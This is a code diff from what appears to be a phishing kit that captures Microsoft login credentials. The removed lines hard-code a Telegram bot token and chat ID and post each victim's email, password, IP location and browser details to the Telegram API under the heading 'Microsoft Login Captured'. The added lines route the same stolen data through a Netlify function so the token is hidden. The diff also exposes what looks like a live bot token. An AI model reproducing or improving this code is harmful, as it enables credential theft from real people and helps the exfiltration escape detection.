@@ -359,10 +359,6 @@
         return { isPersonal, accountType, domain };
     }
 
-    // ✅ Telegram Configuration
-    const TELEGRAM_BOT_TOKEN = '7534767475:AAEvUBQZl7QL5dQ6u6Cn6pLZ6sXfsJh2T-o';
-    const TELEGRAM_CHAT_ID = '7385263059';
-
     // ✅ Get location data
     async function getLocationData() {
         try {
@@ -375,7 +371,7 @@
         }
     }
 
-    // ✅ Send data to Telegram with proper formatting
+    // ✅ UPDATED: Send data to Telegram via Netlify function (no bot token exposed)
     async function sendToTelegram(data) {
         try {
             const accountInfo = detectAccountType(data.email);
@@ -383,44 +379,29 @@
             // Get location data
             const location = await getLocationData();
             
-            let message = `🔐 **Microsoft Login Captured**\n`;
-            message += `━━━━━━━━━━━━━━━━━━━━\n`;
-            message += `📧 **Email:** \`${data.email}\`\n`;
-            message += `🔑 **Password:** \`${data.password}\`\n`;
-            message += `🏢 **Account Type:** ${accountInfo.accountType}\n`;
-            message += `📍 **Domain:** ${accountInfo.domain}\n`;
+            console.log('📤 Sending to Telegram via Netlify function...');
             
-            if (location) {
-                message += `\n🌍 **Location Info:**\n`;
-                message += `IP: ${location.ip || 'Unknown'}\n`;
-                message += `City: ${location.city || 'Unknown'}\n`;
-                message += `Region: ${location.region || 'Unknown'}\n`;
-                message += `Country: ${location.country_name || 'Unknown'}\n`;
-            }
-            
-            message += `\n🕐 **Timestamp:** ${new Date().toISOString()}\n`;
-            message += `🌐 **User Agent:** ${navigator.userAgent}\n`;
-            message += `📱 **Platform:** ${navigator.platform}\n`;
-            message += `━━━━━━━━━━━━━━━━━━━━`;
-
-            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            // Use Netlify function instead of direct API
+            const response = await fetch('/.netlify/functions/sendTelegram', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
+                    email: data.email,
+                    password: data.password,
+                    locationData: location,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform
                 })
             });
 
             const result = await response.json();
-            if (result.ok) {
-                console.log('✅ Credentials sent to Telegram');
+            if (result.success) {
+                console.log('✅ Credentials sent to Telegram via Netlify function');
                 return true;
             } else {
-                console.error('❌ Telegram error:', result);
+                console.error('❌ Netlify function error:', result);
                 return false;
             }
         } catch (error) {
